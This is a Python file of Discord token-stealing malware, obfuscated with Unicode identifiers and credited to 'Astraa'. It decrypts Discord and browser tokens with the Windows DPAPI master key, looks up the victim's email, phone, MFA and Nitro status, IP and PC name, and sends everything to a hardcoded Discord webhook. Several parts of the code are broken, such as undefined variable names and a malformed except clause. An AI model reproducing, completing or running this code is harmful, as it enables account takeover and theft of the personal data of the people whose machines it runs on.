from base64 import b64decode
ߜ=None
샙=True
ﱤ=open
𑘬=IndexError
즎=False
𨨯=bool
ﺧ=len
ﯚ=abs
from Crypto.Cipher import AES
𞢓=AES.MODE_GCM
ﶸ=AES.new
from win32crypt import CryptUnprotectData
from os import getlogin,listdir
from json import loads
from re import findall
from urllib.request import Request,urlopen
from subprocess import Popen,PIPE
import requests,json,os
𮏛=os.path
𤟓=os.getenv
𩟜=json.dumps
𞢰=requests.get
from datetime import datetime
ﶋ=datetime.strptime
殓=[]
ࢴ=[]
ﰐ=[]
def 𬘳(buff,master_key):
 try:
  return ﶸ(CryptUnprotectData(master_key,ߜ,ߜ,ߜ,0)[1],𞢓,buff[3:15]).decrypt(buff[15:])[:-16].decode()
 except:
  return "Error"
def ﰔ():
 𐦗="None"
 try:
  𐦗=urlopen(Request("https://api.ipify.org")).read().decode().strip()
 except:pass
 return 𐦗
def 䉝():
 줷=Popen("wmic csproduct get uuid",shell=샙,stdin=PIPE,stdout=PIPE,stderr=PIPE)
 return(줷.stdout.read()+줷.stderr.read()).decode().split("\n")[1]
def 𒒖():
 𓍕=[]
 ﰐ=[]
 𞺲=𤟓('LOCALAPPDATA')
 𞤓=𤟓('APPDATA')
 𡇄=𞺲+"\\Google\\Chrome\\User Data"
 䁃={'Discord':𞤓+'\\discord','Discord Canary':𞤓+'\\discordcanary','Lightcord':𞤓+'\\Lightcord','Discord PTB':𞤓+'\\discordptb','Opera':𞤓+'\\Opera Software\\Opera Stable','Opera GX':𞤓+'\\Opera Software\\Opera GX Stable','Amigo':𞺲+'\\Amigo\\User Data','Torch':𞺲+'\\Torch\\User Data','Kometa':𞺲+'\\Kometa\\User Data','Orbitum':𞺲+'\\Orbitum\\User Data','CentBrowser':𞺲+'\\CentBrowser\\User Data','7Star':𞺲+'\\7Star\\7Star\\User Data','Sputnik':𞺲+'\\Sputnik\\Sputnik\\User Data','Vivaldi':𞺲+'\\Vivaldi\\User Data\\Default','Chrome SxS':𞺲+'\\Google\\Chrome SxS\\User Data','Chrome':𡇄+'Default','Epic Privacy Browser':𞺲+'\\Epic Privacy Browser\\User Data','Microsoft Edge':𞺲+'\\Microsoft\\Edge\\User Data\\Defaul','Uran':𞺲+'\\uCozMedia\\Uran\\User Data\\Default','Yandex':𞺲+'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':𞺲+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':𞺲+'\\Iridium\\User Data\\Default'}
 for ڽ,𨘧 in 䁃.items():
  if not 𮏛.exists(𨘧):continue
  try:
   with ﱤ(𨘧+f"\\Local State","r")as ݷ:
    𫮬=loads(ݷ.read())['os_crypt']['encrypted_key']
    ݷ.close()
  except:continue
  for ݷ in listdir(𨘧+f"\\Local Storage\\leveldb\\"):
   if not ݷ.endswith(".ldb")and ݷ.endswith(".log"):continue
   else:
    try:
     with ﱤ(𨘧+f"\\Local Storage\\leveldb\\{file}","r",errors='ignore')as files:
      for 𐲃 in files.readlines():
       𐲃.strip()
       for 𪎷 in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",𐲃):
        殓.append(𪎷)
    except PermissionError:continue
  for 𬂳 in 殓:
   if 𬂳.endswith("\\"):
    𬂳.replace("\\","")
   elif 𬂳 not in ࢴ:
    ࢴ.append(𬂳)
  for 𞤰 in ࢴ:
   try:
    렿=𬘳(b64decode(𞤰.split('dQw4w9WgXcQ:')[1]),b64decode(𫮬)[5:])
   except 𑘬=="Error":continue
   ﰐ.append(렿)
   for 𛋠 in ﰐ:
    if 𛋠 not in 𓍕:
     𓍕.append(𛋠)
     余={'Authorization':렿,'Content-Type':'application/json'}
     try:
      ﲦ=𞢰('https://discordapp.com/api/v6/users/@me',headers=余)
     except:continue
     if ﲦ.status_code==200:
      ﰊ=ﲦ.json()
      𐦗=ﰔ()
      薗=𤟓("UserName")
      ﳅ=𤟓("COMPUTERNAME")
      𢅪=f'{res_json["username"]}#{res_json["discriminator"]}'
      𞠮=ﰊ['id']
      ڤ=ﰊ['email']
      𘚟=ﰊ['phone']
      𦁦=ﰊ['mfa_enabled']
      𩢊=즎
      ﲦ=𞢰('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=余)
      ﰀ=ﲦ.json()
      𩢊=𨨯(ﺧ(ﰀ)>0)
      ߗ=0
      if 𩢊:
       𐚽=ﶋ(ﰀ[0]["current_period_end"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
       𐫒=ﶋ(ﰀ[0]["current_period_start"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
       ߗ=ﯚ((𐫒-𐚽).days)
      훘=f"""**{user_name}** *({user_id})*
> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`
> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`
> :piñata: __Token__
	`{tok}`
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""      
      𧘈=𩟜({'content':훘,'username':'Token Grabber - Made by Astraa','avatar_url':'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
      try:
       𐲛={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
       ﲆ=Request('https://discord.com/api/webhooks/1353095257767809074/iA8hWf5AZU0XjWg2Z-Ihq-jEFnE_PrPHksg7_zHP4CKtxk5xY4RpmemzoVxZz5cDlJs1',data=𧘈.encode(),headers=𐲛)
       urlopen(ﲆ)
      except:continue
    else:continue
if __name__=='__main__':
 𒒖()
